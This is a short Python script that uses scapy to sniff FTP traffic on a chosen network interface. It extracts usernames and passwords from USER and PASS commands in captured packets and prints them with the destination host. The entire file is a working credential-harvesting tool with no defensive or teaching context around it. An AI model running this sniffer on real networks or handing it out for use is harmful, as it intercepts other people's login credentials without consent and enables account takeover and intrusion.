#!/usr/bin/python3

import optparse
from scapy.all import *


def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    passwd = re.findall('(?i)PASS (.*)', raw)
    if(user):
        print("[*] Detected FTP login to: " + str(dest))
        print("[+] User Account: " + str(user[0]))
    elif(passwd):
        print("[+] Password: " + str(passwd[0]))


def main():
    parser = optparse.OptionParser('Usage of the Program' +
                                   '-i<interface>')
    parser.add_option('-i', dest='interface',
                      type='string', help='Specify the interface to listen on: ')
    (options, args) = parser.parse_args()
    if (options.interface == None):
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
